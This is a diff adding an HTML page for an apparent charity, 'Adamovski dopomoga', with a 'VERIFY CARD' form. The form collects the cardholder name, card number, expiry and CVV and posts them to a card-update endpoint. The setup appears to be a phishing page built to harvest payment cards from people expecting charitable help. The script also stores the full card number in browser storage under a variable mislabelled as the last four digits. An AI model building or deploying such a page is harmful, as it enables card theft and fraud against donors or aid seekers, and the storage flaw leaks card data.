@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Credit Card</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+    <header class="header">
+        <div class="logo">Adamovski <br> dopomoga</div>
+    </header>
+
+    <div class="container">
+        <form class="card-form" id="card-form">
+            <h2>Credit Card</h2>
+
+            <input type="text" id="holder" placeholder="Credit Card Holder" required />
+
+            <!-- номер карты + бренд -->
+            <div class="card-input-wrapper">
+                <input type="text" id="card" placeholder="Card Number" maxlength="19" required />
+                <span id="card-brand"></span>
+            </div>
+
+            <input type="text" id="exp" placeholder="MM/YY" maxlength="5" required />
+            <input type="text" id="cvv" placeholder="CCV" required />
+
+            <button type="submit">VERIFY CARD</button>
+        </form>
+    </div>
+
+    <footer class="footer">
+        <p>© Charitable Foundation 2025.</p>
+        <span>
+      By clicking "VERIFY", you agree to our
+      <a href="#">Terms of Service</a> and
+      <a href="#">Privacy Policies</a>.
+    </span>
+    </footer>
+
+    <script>
+        // ===== helpers =====
+        // Алгоритм Луна
+        function isValidLuhn(digits) {
+            let sum = 0;
+            let shouldDouble = false;
+
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let d = parseInt(digits[i], 10);
+                if (shouldDouble) {
+                    d = d * 2;
+                    if (d > 9) d -= 9;
+                }
+                sum += d;
+                shouldDouble = !shouldDouble;
+            }
+
+            return sum % 10 === 0;
+        }
+
+        // Определяем бренд по цифрам
+        function getCardBrand(digits) {
+            if (!digits) return "";
+
+            if (digits[0] === "4") return "Visa";
+
+            const first2 = parseInt(digits.substring(0, 2), 10);
+            const first4 = parseInt(digits.substring(0, 4), 10);
+
+            if (first2 >= 51 && first2 <= 55) return "MasterCard";
+            if (first4 >= 2221 && first4 <= 2720) return "MasterCard";
+
+            return "Unknown";
+        }
+
+        const expInput = document.getElementById("exp");
+        const cvvInput = document.getElementById("cvv");
+        const cardInput = document.getElementById("card");
+        const holderInput = document.getElementById("holder");
+        const form = document.getElementById("card-form");
+        const cardBrandEl = document.getElementById("card-brand");
+
+        // ===== MM/YY (автоматически ставим "/" после двух цифр) =====
+        expInput.addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, ""); // только цифры
+            value = value.substring(0, 4); // максимум 4 цифры: MMYY
+
+            if (value.length >= 3) {
+                value = value.slice(0, 2) + "/" + value.slice(2);
+            }
+
+            e.target.value = value;
+        });
+
+        // ===== CVV (только 3 цифры) =====
+        cvvInput.addEventListener("input", function(e) {
+            let v = e.target.value.replace(/\D/g, "");
+            e.target.value = v.substring(0, 3);
+        });
+
+        // ===== Card number 4-4-4-4 + бренд =====
+        cardInput.addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, "");
+            value = value.substring(0, 16);
+
+            // Маска 4-4-4-4
+            let formatted = "";
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += " ";
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+
+            const digits = value;
+            const brand = getCardBrand(digits);
+
+            if (digits.length >= 1) {
+                if (brand === "Visa" || brand === "MasterCard") {
+                    cardBrandEl.textContent = brand;
+                } else {
+                    cardBrandEl.textContent = "";
+                }
+            } else {
+                cardBrandEl.textContent = "";
+            }
+        });
+
+        // ===== submit =====
+        form.addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const holder = holderInput.value;
+            const cardNumber = cardInput.value;
+            const exp = expInput.value;
+            const cvv = cvvInput.value;
+
+            const digits = cardNumber.replace(/\D/g, "");
+
+            // проверка длины + Luhn
+            if (digits.length !== 16 || !isValidLuhn(digits)) {
+                alert("Invalid card number");
+                return;
+            }
+
+            const brand = getCardBrand(digits);
+            if (brand !== "Visa" && brand !== "MasterCard") {
+                alert("Unsupported card type");
+                return;
+            }
+
+            try {
+                const res = await fetch("/api/v1/card-update", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        holder,
+                        cardNumber,
+                        exp,
+                        cvv
+                    }),
+                });
+
+                if (!res.ok) throw new Error("Request failed");
+
+                // сохраняем данные по карте в localStorage
+                const cardDigits = digits; // чистый номер
+                const cardLast4 = cardDigits; // последние 4 цифры
+
+                localStorage.setItem(
+                    "cardData",
+                    JSON.stringify({
+                        holder,
+                        cardLast4,
+                        cardBrand: brand,
+                    })
+                );
+
+                // form.reset(); // можно не трогать, всё равно редирект
+                // cardBrandEl.textContent = "";
+
+                window.location.href = "/card/message.html";
+
+            } catch (err) {
+                console.error(err);
+                alert("Server error, try again later");
+            }
+        });
+    </script>
+</body>
+
+</html>
